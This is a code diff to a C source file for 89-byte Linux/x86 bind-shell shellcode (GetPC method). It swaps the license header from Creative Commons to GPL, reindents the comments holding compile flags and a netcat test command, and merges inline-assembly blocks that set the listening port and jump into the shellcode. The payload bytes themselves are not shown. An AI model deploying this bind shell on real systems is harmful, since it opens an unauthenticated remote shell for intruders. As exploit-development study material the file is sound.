@@ -1,53 +1,41 @@
 /*
 
- Shell Bind TCP (GetPC/Call/Ret Method) - C Language
- Linux/x86
-
- Written in 2013 by Geyslan G. Bem, Hacking bits
+ Shell Bind TCP (GetPC/Call/Ret Method) Shellcode - C Language - Linux/x86
+ Copyright (C) 2013 Geyslan G. Bem, Hacking bits
 
    http://hackingbits.com
    geyslan@gmail.com
 
- This source is licensed under the Creative Commons
- Attribution-ShareAlike 3.0 Brazil License.
+ This program is free software: you can redistribute it and/or modify
+ it under the terms of the GNU General Public License as published by
+ the Free Software Foundation, either version 3 of the License, or
+ (at your option) any later version.
 
- To view a copy of this license, visit
+ This program is distributed in the hope that it will be useful,
+ but WITHOUT ANY WARRANTY; without even the implied warranty of
+ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ GNU General Public License for more details.
 
-   http://creativecommons.org/licenses/by-sa/3.0/
-
- You are free:
-
-    to Share - to copy, distribute and transmit the work
-    to Remix - to adapt the work
-    to make commercial use of the work
-
- Under the following conditions:
-   Attribution - You must attribute the work in the manner
-                 specified by the author or licensor (but
-                 not in any way that suggests that they
-                 endorse you or your use of the work).
-
-   Share Alike - If you alter, transform, or build upon
-                 this work, you may distribute the
-                 resulting work only under the same or
-                 similar license to this one.
+ You should have received a copy of the GNU General Public License
+ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 */
 
+
 /*
 
- shell_bind_tcp_getpc_shellcode
+   shell_bind_tcp_getpc_shellcode
 
- * 89 bytes
- * null-bytes free
- * uses GetPC method for fun and profit
+   * 89 bytes
+   * null-bytes free
+   * uses GetPC method for fun and profit
 
 
- # gcc -m32 -fno-stack-protector -z execstack shell_bind_tcp_getpc_shellcode.c -o shell_bind_tcp_getpc_shellcode
- # ./shell_bind_tcp_getpc_shellcode
+   # gcc -m32 -fno-stack-protector -z execstack shell_bind_tcp_getpc_shellcode.c -o shell_bind_tcp_getpc_shellcode
+   # ./shell_bind_tcp_getpc_shellcode
 
- Testing
- # nc 127.0.0.1 11111
+   Testing
+   # nc 127.0.0.1 11111
 
 */
 
@@ -81,12 +69,12 @@ main ()
 		 "movl %eax, %edx\n\t"
 		 "movl %eax, %esi\n\t"
 		 "movl %eax, %edi\n\t"
-		 "movl %eax, %ebp");
+		 "movl %eax, %ebp\n\t"
 
 
 	// Setting the port number (byte reverse order) and Calling the shellcode
 
-	__asm__ ("movw $0x672b, (code+27)\n\t"
+		"movw $0x672b, (code+27)\n\t"
 		"call code");
-	
+
 }
